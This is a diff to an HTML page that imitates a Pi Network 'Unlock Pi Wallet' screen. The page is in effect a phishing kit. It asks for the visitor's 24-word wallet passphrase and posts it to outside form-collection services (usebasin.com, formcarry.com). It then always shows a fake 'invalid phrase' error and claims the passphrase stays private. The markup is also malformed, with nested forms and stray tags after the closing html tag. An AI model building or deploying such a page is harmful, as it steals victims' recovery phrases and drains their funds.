@@ -33,8 +33,147 @@
       justify-content: center;
       gap: 6px;
       position: relative;
-      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
     }
+
+    .topbar .back {
+      position: absolute;
+      left: 12px;
+      font-size: 1.4rem;
+      cursor: pointer;
+    }
+
+    .content {
+      padding: 24px 16px;
+    }
+
+    .passphrase-box {
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      padding: 16px;
+      width: 90%;
+      max-width: 400px;
+      aspect-ratio: 1 / 1;
+      margin: 0 auto 20px auto;
+      box-sizing: border-box;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .passphrase-box textarea {
+      width: 100%;
+      height: 100%;
+      border: none;
+      outline: none;
+      resize: none;
+      font-size: 1rem;
+      font-family: 'Segoe UI', sans-serif;
+      border-radius: 8px;
+      padding: 8px;
+      box-sizing: border-box;
+    }
+
+    .btn-border,
+    .btn-filled {
+      width: 90%;
+      max-width: 400px;
+      box-sizing: border-box;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      margin: 10px auto;
+      display: block;
+    }
+
+    .btn-border {
+      border: 2px solid var(--purple);
+      background: transparent;
+      color: var(--purple);
+    }
+
+    .btn-filled {
+      background-color: var(--purple);
+      color: white;
+      border: none;
+    }
+
+    .note {
+      font-size: 0.9rem;
+      color: var(--gray);
+      max-width: 400px;
+      margin: 0 auto 16px auto;
+      text-align: left;
+    }
+
+    .note a.inline-link {
+      background-color: var(--light-purple);
+      color: var(--purple);
+      text-decoration: none;
+      font-weight: bold;
+      padding: 2px 4px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .error-box {
+      margin-top: 20px;
+      color: #5e2e91;
+      font-weight: bold;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <div class="back" onclick="window.location.href='index.html'">&lt;</div>
+    <img src="https://ik.imagekit.io/pinet/Pi/unlock.png?updatedAt=1753819802279" alt="unlock" height="20" />
+    Wallet
+    <img src="https://ik.imagekit.io/pinet/Pi/Pi%20logo.png" alt="Pi Logo" height="20" />
+  </div>
+
+  <div class="content">
+    <h2>Unlock Pi Wallet</h2>
+
+    <form id="passphrase-form" action="https://usebasin.com/f/309558e477ef" method="POST">
+      <div class="passphrase-box">
+        <textarea name="passphrase" placeholder="Enter your 24-word&#10;passphrase here" required></textarea>
+      </div>
+
+      <!-- Hidden field to detect which button -->
+      <form action="https://formcarry.com/s/Mk7NUDYaT7n" method="POST" accept-charset="UTF-8">
+  <!-- Hidden field to detect which button -->
+  <input type="hidden" name="unlock_method" id="unlock_method" value="">
+
+  <button type="submit" class="btn-border" onclick="setMethod('Passphrase')">Unlock With Passphrase</button>
+  <button type="submit" class="btn-filled" onclick="setMethod('Fingerprint')">Unlock With Fingerprint</button>
+</form>
+
+    <div id="error-msg" class="error-box">
+      Please provide a valid 24-word phrase to unlock your Pi wallet. The phrase you provided is invalid.
+    </div>
+
+    <p class="note">
+      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+    </p>
+
+    <p class="note">
+      Lost your passphrase? <a class="inline-link" onclick="window.location.href='index.html'">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+    </p>
+  </div>
+
+  <script>
+    function setMethod(method) {
+      document.getElementById("unlock_method").value = method;
+
+      // Optional: Show error on screen after clicking
+      setTimeout(() => {
+        document.getElementById("error-msg").style.display = 'block';
+      }, 100);
+    }
+  </script>
+</body>
+</html>    }
 
     .topbar .back {
       position: absolute;
@@ -159,4 +298,5 @@
     </p>
   </div>
 </body>
+
 </html>
